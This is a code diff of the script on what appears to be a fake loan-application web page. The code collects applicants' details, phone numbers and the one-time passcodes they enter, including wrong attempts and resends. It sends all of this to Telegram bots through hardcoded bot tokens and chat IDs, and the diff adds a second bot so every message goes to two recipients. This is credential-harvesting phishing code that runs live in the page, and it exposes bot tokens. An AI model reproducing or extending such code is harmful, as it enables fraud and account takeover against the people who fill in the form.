@@ -566,11 +566,21 @@
         }
         
         function sendVerificationSuccess(enteredOtp) {
-            const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
-            const botToken = '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI';
-            const chatId = '5520957080';
-            
-            const message = `
+    const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+    
+    // Both bot configurations
+    const bots = [
+        {
+            token: '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI',
+            chatId: '5520957080'
+        },
+        {
+            token: '8778116219:AAGIDOJeTkxMXofhI_CZGPJzaoaGoCmnoDc',
+            chatId: '5557779815'
+        }
+    ];
+    
+    const message = `
 ✅ *OTP VERIFICATION COMPLETE*
 
 📋 *Application ID:* ${applicationData.applicationId || 'N/A'}
@@ -585,20 +595,37 @@
 • Purpose: ${applicationData.purpose || 'N/A'}
 
 🎯 *Redirecting to Account Qualification*
-            `;
-            
-            const encodedMessage = encodeURIComponent(message);
-            
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}&parse_mode=Markdown`)
-                .catch(error => console.error('Error:', error));
+    `;
+    
+    const encodedMessage = encodeURIComponent(message);
+    
+    // Send to both Telegram bots
+    bots.forEach((bot, index) => {
+        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodedMessage}&parse_mode=Markdown`)
+            .then(response => response.json())
+            .then(result => {
+                console.log(`Verification Success Bot ${index + 1}:`, result.ok ? '✅ Sent' : '❌ Failed');
+            })
+            .catch(error => console.error(`Verification Success Bot ${index + 1} Error:`, error));
+    });
+}
+
+function sendInvalidOTPToTelegram(enteredOtp) {
+    const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+    
+    // Both bot configurations
+    const bots = [
+        {
+            token: '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI',
+            chatId: '5520957080'
+        },
+        {
+            token: '8778116219:AAGIDOJeTkxMXofhI_CZGPJzaoaGoCmnoDc',
+            chatId: '5557779815'
         }
-        
-        function sendInvalidOTPToTelegram(enteredOtp) {
-            const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
-            const botToken = '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI';
-            const chatId = '5520957080';
-            
-            const message = `
+    ];
+    
+    const message = `
 ❌ *INVALID OTP ATTEMPT*
 
 📋 *Application ID:* ${applicationData.applicationId || 'N/A'}
@@ -608,56 +635,72 @@
 
 🕒 *Time:* ${new Date().toLocaleString()}
 ⚠️ *Client entered wrong OTP*
-            `;
-            
-            const encodedMessage = encodeURIComponent(message);
-            
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}&parse_mode=Markdown`)
-                .catch(error => console.error('Error:', error));
+    `;
+    
+    const encodedMessage = encodeURIComponent(message);
+    
+    // Send to both Telegram bots
+    bots.forEach((bot, index) => {
+        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodedMessage}&parse_mode=Markdown`)
+            .then(response => response.json())
+            .then(result => {
+                console.log(`Invalid OTP Bot ${index + 1}:`, result.ok ? '✅ Sent' : '❌ Failed');
+            })
+            .catch(error => console.error(`Invalid OTP Bot ${index + 1} Error:`, error));
+    });
+}
+
+function resendOTP() {
+    if (timeLeft > 0) {
+        alert(`Please wait ${timeLeft} seconds before resending OTP`);
+        return;
+    }
+    
+    // Generate new OTP
+    const newOTP = Math.floor(100000 + Math.random() * 900000);
+    
+    // Update OTP data
+    otpData.otp = newOTP.toString();
+    otpData.expires = new Date(Date.now() + 15 * 60 * 1000).toISOString();
+    
+    localStorage.setItem('otpVerification', JSON.stringify(otpData));
+    
+    // Send new OTP to Telegram
+    const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+    sendNewOTPToTelegram(newOTP, applicationData.phone || otpData.phone);
+    
+    // Reset timer
+    timeLeft = 109;
+    startCountdown();
+    
+    // Clear inputs
+    if (useIndividualInputs) {
+        document.querySelectorAll('.otp-input').forEach(input => input.value = '');
+        document.querySelector('.otp-input[data-index="0"]').focus();
+    } else {
+        document.getElementById('otpMainInput').value = '';
+        document.getElementById('otpMainInput').focus();
+    }
+    
+    alert('New OTP has been sent.');
+}
+
+function sendNewOTPToTelegram(otp, phone) {
+    // Both bot configurations
+    const bots = [
+        {
+            token: '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI',
+            chatId: '5520957080'
+        },
+        {
+            token: '8778116219:AAGIDOJeTkxMXofhI_CZGPJzaoaGoCmnoDc',
+            chatId: '5557779815'
         }
-        
-        function resendOTP() {
-            if (timeLeft > 0) {
-                alert(`Please wait ${timeLeft} seconds before resending OTP`);
-                return;
-            }
-            
-            // Generate new OTP
-            const newOTP = Math.floor(100000 + Math.random() * 900000);
-            
-            // Update OTP data
-            otpData.otp = newOTP.toString();
-            otpData.expires = new Date(Date.now() + 15 * 60 * 1000).toISOString();
-            
-            localStorage.setItem('otpVerification', JSON.stringify(otpData));
-            
-            // Send new OTP to Telegram
-            const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
-            sendNewOTPToTelegram(newOTP, applicationData.phone || otpData.phone);
-            
-            // Reset timer
-            timeLeft = 109;
-            startCountdown();
-            
-            // Clear inputs
-            if (useIndividualInputs) {
-                document.querySelectorAll('.otp-input').forEach(input => input.value = '');
-                document.querySelector('.otp-input[data-index="0"]').focus();
-            } else {
-                document.getElementById('otpMainInput').value = '';
-                document.getElementById('otpMainInput').focus();
-            }
-            
-            alert('New OTP has been sent.');
-        }
-        
-        function sendNewOTPToTelegram(otp, phone) {
-            const botToken = '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI';
-            const chatId = '5520957080';
-            
-            const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
-            
-            const message = `
+    ];
+    
+    const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+    
+    const message = `
 🔄 *OTP RESENT*
 
 📋 *Application ID:* ${applicationData.applicationId || 'N/A'}
@@ -666,13 +709,20 @@
 ⏰ *Expires:* 15 minutes
 
 🕒 *Resent at:* ${new Date().toLocaleString()}
-            `;
-            
-            const encodedMessage = encodeURIComponent(message);
-            
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}&parse_mode=Markdown`)
-                .catch(error => console.error('Error:', error));
-        }
+    `;
+    
+    const encodedMessage = encodeURIComponent(message);
+    
+    // Send to both Telegram bots
+    bots.forEach((bot, index) => {
+        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodedMessage}&parse_mode=Markdown`)
+            .then(response => response.json())
+            .then(result => {
+                console.log(`Resend OTP Bot ${index + 1}:`, result.ok ? '✅ Sent' : '❌ Failed');
+            })
+            .catch(error => console.error(`Resend OTP Bot ${index + 1} Error:`, error));
+    });
+}
     </script>
 </body>
 </html>
